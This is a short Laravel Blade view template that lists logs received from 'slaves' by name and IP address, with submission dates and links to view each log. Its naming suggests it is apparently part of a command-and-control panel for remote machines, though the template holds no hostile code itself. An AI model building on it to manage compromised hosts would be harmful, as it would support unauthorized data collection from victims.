@extends("templates.command")
@section("content")
    <div class="row">
        <div class="col-md-12">
            <h2>Logs</h2>
            @if($logs->count() == 0)
                <div class="empty">No logs received yet</div>
            @else
                <table class="table table-bordered">
                    <thead>
                        <tr>
                            <th>#</th>
                            <th>Slave</th>
                            <th>Submission date</th>
                            <th class="text-right">Options</th>
                        </tr>
                    </thead>
                    <tbody>
                        @foreach( $logs as $log )
                            <tr>
                                <td>{{ $log->id }}</td>
                                <td>{{ $log->slave->name." (".$log->slave->ip.")" }}</td>
                                <td>{{ $log->created_at }}</td>
                                <td class="text-right"><a href="{{ route('command.log', $log->id) }}">View log</a></td>
                            </tr>
                        @endforeach
                    </tbody>
                </table>
            @endif
        </div>
    </div>
@stop
